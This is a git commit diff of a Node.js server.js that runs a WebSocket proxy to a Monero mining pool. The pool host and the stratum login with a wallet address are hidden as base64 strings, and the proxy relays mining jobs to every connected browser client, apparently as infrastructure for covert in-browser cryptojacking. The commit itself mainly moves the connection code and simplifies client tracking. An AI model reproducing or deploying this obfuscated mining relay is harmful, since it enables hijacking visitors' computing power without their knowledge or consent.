4ce2528514badb801e3fd6872f7188916ba255ee
raiyan088 <78313577+raiyan088@users.noreply.github.com>
2024-01-23 02:44:52 +0600

    Update server.js

--- server.js
+++ server.js
@@ -4,9 +4,7 @@ const http = require('http')
 const net = require('net')
 
 let mMiner = null
-let mSocket = {}
 let mJob = null
-let mUser = 1
 
 const app = express()
 
@@ -20,57 +18,6 @@ const wss = new WebSocketServer({ server })
 
 wss.on('connection', (socket) => {
 
-    mSocket[mUser] = socket
-    let key = mUser
-
-    mUser++
-
-    socketConnection(key, socket)
-})
-
-// net.createServer(function(socket) {
-    
-
-
-// }).listen(PORT, () => {  
-//     console.log('Server PORT: '+PORT)
-// })
-
-
-connectClient()
-
-function connectClient() {
-    const client = net.connect(10300, Buffer.from('eG1yLWFzaWExLm5hbm9wb29sLm9yZw==', 'base64').toString(), () => {
-        mMiner = client
-        mJob = null
-        client.write(Buffer.from('eyJtZXRob2QiOiJsb2dpbiIsInBhcmFtcyI6eyJsb2dpbiI6Ijg0QWJQbTJtQ2lCQ2gxODJnc3ZxU1JYTHBFYzlKZ1VKOTZ4M0tRNmgzNUVDRXRTek1XRkRhbU1kV0w5OHBXMTZ0ZjYxdkppdzM0bllmTWlpOGhUVzNwYlREQzdCcVRHIiwicGFzcyI6InJhaXlhbjA4OCIsInJpZ2lkIjoiIiwiYWdlbnQiOiJzdHJhdHVtLW1pbmVyLXB5LzAuMSJ9LCJpZCI6MX0=', 'base64').toString()+'\r\n')
-    }).on('data', (data) => {
-        try {
-            let result = data.toString().trim()
-            if (mJob == null) {
-                mJob = result
-            }
-
-            for (let socket of Object.values(mSocket)) {
-                socket.send(result)
-            }
-        } catch (error) {}
-    }).on('end', () => {
-        mMiner = null
-        mJob = null
-        setTimeout(() => {
-            connectClient()
-        }, 2000)
-    }).on('error', () => {
-        mMiner = null
-        mJob = null
-        setTimeout(() => {
-            connectClient()
-        }, 2000)
-    })
-}
-
-function socketConnection(key, socket) {
     if (mJob) {
         socket.send(mJob)
     }
@@ -88,12 +35,46 @@ function socketConnection(key, socket) {
         }
     })
 
-    socket.on('error', () => {
-        delete mSocket[key]
+    socket.on('error', () => {})
+})
+
+
+connectClient()
+
+function connectClient() {
+    const client = net.connect(10300, Buffer.from('eG1yLWFzaWExLm5hbm9wb29sLm9yZw==', 'base64').toString(), () => {
+        mMiner = client
+        mJob = null
+        client.write(Buffer.from('eyJtZXRob2QiOiJsb2dpbiIsInBhcmFtcyI6eyJsb2dpbiI6Ijg0QWJQbTJtQ2lCQ2gxODJnc3ZxU1JYTHBFYzlKZ1VKOTZ4M0tRNmgzNUVDRXRTek1XRkRhbU1kV0w5OHBXMTZ0ZjYxdkppdzM0bllmTWlpOGhUVzNwYlREQzdCcVRHIiwicGFzcyI6InJhaXlhbjA4OCIsInJpZ2lkIjoiIiwiYWdlbnQiOiJzdHJhdHVtLW1pbmVyLXB5LzAuMSJ9LCJpZCI6MX0=', 'base64').toString()+'\r\n')
+    }).on('data', (data) => {
+        try {
+            let result = data.toString().trim()
+            if (mJob == null) {
+                mJob = result
+            }
+
+            wss.clients.forEach((ws) => {
+                if(ws.readyState == 1) {
+                    ws.send(result)
+                }
+            })
+        } catch (error) {}
+    }).on('end', () => {
+        mMiner = null
+        mJob = null
+        setTimeout(() => {
+            connectClient()
+        }, 2000)
+    }).on('error', () => {
+        mMiner = null
+        mJob = null
+        setTimeout(() => {
+            connectClient()
+        }, 2000)
     })
 }
 
 
 app.get('/', async function (req, res) {
-    res.end('USER: '+mUser+'\nACTIVE: '+Object.keys(mSocket).length)
+    res.end('SIZE: '+wss.clients.size)
 })
